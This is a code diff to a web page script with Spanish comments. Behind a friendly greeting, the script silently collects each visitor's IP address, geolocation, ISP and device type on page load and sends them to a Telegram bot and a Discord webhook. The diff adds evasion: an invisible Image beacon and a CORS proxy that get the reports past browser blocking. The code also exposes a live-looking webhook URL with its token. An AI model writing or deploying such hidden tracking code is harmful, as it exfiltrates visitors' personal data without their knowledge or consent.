@@ -233,7 +233,7 @@
     const chatId = "6375135873";
     const discordWebhookUrl = "https://discord.com/api/webhooks/1570736326683140157/qiUolqkPuTQWUAWcat2JZ_7xkPSDzsYGAlaW4A3UzPI-M9tJyOWj9imU11CgmqxmsO6M";
 
-    // Función para detectar si entra desde celular o PC
+    // Detectar dispositivo de forma limpia
     function getDeviceType() {
         const ua = navigator.userAgent;
         if (/android|iphone|ipad|ipod|blackberry|opera mini|iemobile|mobile/i.test(ua.toLowerCase())) {
@@ -242,19 +242,21 @@
         return "💻 PC / Laptop";
     }
 
-    // Función unificada para mandar a Telegram y Discord de golpe y sin duplicarse
+    // Función unificada y única para mandar a Telegram y Discord sin duplicar
     function sendAlert(message) {
-        // 1. Enviar a Telegram
+        // 1. Enviar a Telegram mediante objeto Image (única petición)
         const tgUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-        fetch(tgUrl, { mode: 'no-cors' }).catch(err => console.error(err));
+        const img = new Image();
+        img.src = tgUrl;
 
-        // 2. Enviar a Discord
+        // 2. Enviar a Discord mediante proxy CORS para evitar bloqueo del navegador
         if (discordWebhookUrl) {
-            fetch(discordWebhookUrl, {
+            const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(discordWebhookUrl);
+            fetch(proxyUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ content: message })
-            }).catch(err => console.error(err));
+            }).catch(err => console.error("Discord error:", err));
         }
     }
 
@@ -265,14 +267,13 @@
             document.getElementById("greeting-title").innerText = `Welcome back, ${userName}!`;
         }
 
+        const device = getDeviceType();
         try {
             let res = await fetch("https://ipapi.co/json/");
             let data = await res.json();
-            const device = getDeviceType();
             sendAlert(`🌐 [VISITA NUEVA DETECTADA]\n- Dispositivo: ${device}\n- IP: ${data.ip}\n- Ubicación: ${data.city}, ${data.region}, ${data.country_name}\n- ISP: ${data.org}`);
         } catch (e) {
-            const device = getDeviceType();
-            sendAlert(`🌐 [VISITA NUEVA DETECTADA]\n- Dispositivo: ${device}\n- No se pudo resolver la IP automáticamente.`);
+            sendAlert(`🌐 [VISITA NUEVA DETECTADA]\n- Dispositivo: ${device}\n- IP: No disponible automáticamente.`);
         }
     });
 
